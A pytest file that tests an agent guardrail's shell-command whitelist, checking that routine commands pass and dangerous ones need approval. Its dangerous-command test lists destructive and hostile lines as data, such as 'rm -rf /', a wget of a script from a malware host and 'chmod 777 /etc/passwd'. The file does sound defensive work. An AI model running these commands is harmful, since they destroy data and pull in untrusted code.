"""Tests for #380: safe command whitelist in PersonalGuardrailPolicy.

Verifies that common safe commands (mkdir, ls, pytest, etc.) are
whitelisted by default and do not trigger approval in PersonalGuardrails.
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from core.models import PersonalGuardrailPolicy  # noqa: E402
from guardrails.policy import PersonalGuardrails  # noqa: E402
from tools.registry import ToolRegistry  # noqa: E402


@pytest.fixture
def guardrails():
    """Create PersonalGuardrails with default policy."""
    policy = PersonalGuardrailPolicy()
    return PersonalGuardrails(
        policy=policy,
        tool_registry=ToolRegistry(),
        non_interactive=True,
    )


class TestSafeCommandWhitelist:
    """Verify safe commands pass without approval."""

    @pytest.mark.parametrize("cmd", [
        "mkdir -p /tmp/project",
        "mkdir -p /tmp/a/b/c",
        "ls -la",
        "cat README.md",
        "touch newfile.py",
        "pwd",
        "which python",
        "echo hello",
        "head -20 file.py",
        "tail -10 file.py",
        "wc -l *.py",
        "find . -name '*.py'",
        "python -m pytest tests/",
        "python3 -m pytest -v",
        "pytest tests/test_foo.py",
    ])
    def test_safe_commands_allowed(self, guardrails, cmd):
        """Safe commands should be allowed without approval."""
        result = guardrails.evaluate("bash", {"command": cmd})
        assert result.decision == "allowed", (
            f"Command '{cmd}' should be allowed "
            f"but got {result.decision}"
        )

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "curl http://example.com",
        "wget http://malware.com/script.sh",
        "chmod 777 /etc/passwd",
        "pip install suspicious-package",
        "bash -c 'rm -rf *'",
    ])
    def test_dangerous_commands_require_approval(self, guardrails, cmd):
        """Dangerous commands should still require approval."""
        result = guardrails.evaluate("bash", {"command": cmd})
        assert result.decision == "pending_approval", (
            f"Command '{cmd}' should require approval but got {result.decision}"
        )

    def test_default_whitelist_not_empty(self):
        """Default whitelist should contain safe commands."""
        policy = PersonalGuardrailPolicy()
        assert len(policy.whitelist_commands) > 0
        assert "mkdir" in policy.whitelist_commands
        assert "pytest" in policy.whitelist_commands

    def test_custom_whitelist_overrides_default(self):
        """Custom whitelist should override defaults."""
        policy = PersonalGuardrailPolicy(whitelist_commands=["git status"])
        assert policy.whitelist_commands == ["git status"]
